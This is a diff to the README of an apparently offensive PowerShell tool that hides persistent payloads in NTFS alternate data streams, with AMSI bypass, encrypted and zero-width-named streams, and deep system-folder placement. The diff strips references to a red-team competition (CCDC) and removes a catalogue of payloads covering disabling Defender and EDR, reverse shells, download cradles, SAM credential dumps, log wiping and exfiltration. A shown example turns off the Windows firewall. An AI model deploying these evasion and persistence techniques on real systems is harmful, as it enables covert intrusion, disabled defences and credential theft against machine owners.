@@ -61,7 +61,7 @@ With no extra flags, this uses: Obfuscate=**Advanced** (deep placement + randomi
 | `-Randomize $true\|$false` | bool | Implied by tier | Randomize all artifact names. |
 | `-UseDeepPlacement $true\|$false` | bool | Implied by tier | Bury ADS in `WER\Cache`, deep system dirs. |
 | `-AttachToExisting $true\|$false` | bool | Implied by tier | Attach ADS to existing file vs. create new. |
-| `-NoAmsi` | switch | off | Disable AMSI bypass injection (almost never use this). |
+| `-NoAmsi` | switch | off | Disable AMSI bypass injection (to each their own). |
 
 ### Stream & artifact naming
 
@@ -83,9 +83,9 @@ This is the primary dial. Most other evasion parameters are implied by the tier.
 
 | Tier | Names | Placement | Stream Name | ZW | Encrypt | When to use |
 |------|-------|-----------|-------------|-----|---------|-------------|
-| `None` | Fixed (`SystemOptimization`) | `C:\ProgramData\` | `payload` | No | No | Testing only. Never in competition. |
+| `None` | Fixed (`SystemOptimization`) | `C:\ProgramData\` | `payload` | No | No | Testing only. |
 | `Basic` | Word-list randomized | `C:\ProgramData\` | Random 8 chars | No | No | Quick deployment, acceptable stealth. |
-| `Advanced` | Word-list randomized | Deep (`WER\Cache`, etc.) | **`Zone.Identifier`** | No | **Yes** | **Default. Standard CCDC deployment.** |
+| `Advanced` | Word-list randomized | Deep (`WER\Cache`, etc.) | **`Zone.Identifier`** | No | **Yes** | **Default.** |
 | `Paranoid` | Word-list randomized | Deep + attach to existing | **`$Data`+ZW** | **Yes** | **Yes** | Max stealth. Save the manifest — cleanup requires codepoints. |
 
 **v2.5 tier-implied defaults (you don't need to set these manually):**
@@ -166,24 +166,6 @@ pwsh src/ADS-OneLiner.ps1 \
   -OutputFile /tmp/fw-off.txt
 ```
 
-| Category | IDs | What it does |
-|----------|-----|-------------|
-| `FW-*` | FW-001–008 | Disable firewall, open ports, nuclear silent kill |
-| `RDP-*` | RDP-001–004 | Enable RDP, disable NLA, change port |
-| `USR-*` | USR-001–006 | Local admin, hidden admin, password never expires |
-| `SVC-*` | SVC-001–006 | Disable Defender, Sysmon, Event Log, EDR shotgun |
-| `C2-*` | C2-001–007 | Download cradles, reverse shell, BITSAdmin, DNS beacon |
-| `CRED-*` | CRED-001–008 | SAM/SYSTEM dump, Credential Manager, cred file hunt |
-| `DEF-*` | DEF-001–009 | Clear logs, disable PS logging, wipe Defender history |
-| `RECON-*` | RECON-001–006 | System enum, domain enum, privesc surface |
-| `LAT-*` | LAT-001–005 | WinRM, PSRemoting, WMI, SMB shares, relay prep |
-| `EXFIL-*` | EXFIL-001–003 | Stage files, HTTP exfil, ICMP beacon |
-| `FUN-*` | FUN-001–008 | Desktop effects — **interactive session required** |
-| `MEME-*` | MEME-001–009 | Fake BSOD, clipboard hijack, LED disco, Matrix rain, OIIA |
-| `COMBO-*` | COMBO-001–003 | Multi-action packages (FW+RDP+admin+logging) |
-
-See `tests/RED-TEAM-SHOWCASE.md` for curated scenarios.
-
 ---
 
 ## Session Isolation: SYSTEM vs. Interactive Payloads
@@ -233,7 +215,7 @@ pwsh src/ADS-OneLiner.ps1 \
   -OutputFile /tmp/fast.txt
 ```
 
-### Standard CCDC deployment (Advanced stealth, multi-trigger, redundant instances)
+### Standard deployment (Advanced stealth, multi-trigger, redundant instances)
 ```bash
 pwsh src/ADS-OneLiner.ps1 \
   -Payload 'netsh advfirewall set allprofiles state off' \
@@ -385,15 +367,5 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand AAAA...
 ## Cleanup (on Windows)
 
 The generated output file includes a `CLEANUP` section at the bottom. Also check your manifest in `./manifests/manifest-*.json` for the exact paths, task names, and stream codepoints.
-
-```powershell
-# Quick: remove all non-Microsoft tasks
-Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } |
-    ForEach-Object { Unregister-ScheduledTask $_.TaskName -Confirm:$false }
-
-# Check registry Run keys for leftover entries
-Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object * -ExcludeProperty PS*
-Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object * -ExcludeProperty PS*
-```
 
 For zero-width (Paranoid tier) streams: use the codepoints from the manifest — the stream name is invisible and cannot be typed manually.
